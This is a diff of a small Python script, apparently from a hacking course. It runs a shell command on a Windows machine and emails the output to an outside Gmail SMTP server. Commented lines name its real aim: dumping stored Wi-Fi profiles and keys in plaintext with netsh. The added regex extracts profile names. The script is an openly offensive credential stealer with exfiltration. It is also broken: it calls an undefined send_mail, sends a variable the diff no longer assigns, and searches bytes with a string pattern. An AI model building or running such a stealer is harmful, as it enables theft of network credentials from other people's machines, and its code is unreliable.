@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 def send_email(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
@@ -17,11 +17,16 @@ def send_email(email, password, message):
     
 
 #command = "msg * Test Message"
-#command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on computer, key in plaintext form
+#command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on winx computer, key in plaintext form
 email = input("Enter email address to send to: ")
 password = input("Enter email password: ")
 command = "hostname"
-result = subprocess.check_output(command, shell=True)
+#result = subprocess.check_output(command, shell=True)
+networks = subprocess.check_output(command, shell=True)
+network_names = re.search("(Profile\s*:\s) (.*)", networks)
+# \s regex to search for blank space, * specifies any number of blank spaces
+# ( second group - . -any char, * - any number of ocurrences
+
 send_mail(email, password, result)
 #no hardcoded creds to see here, move along creeps
 #subprocess.Popen(command, shell=True)
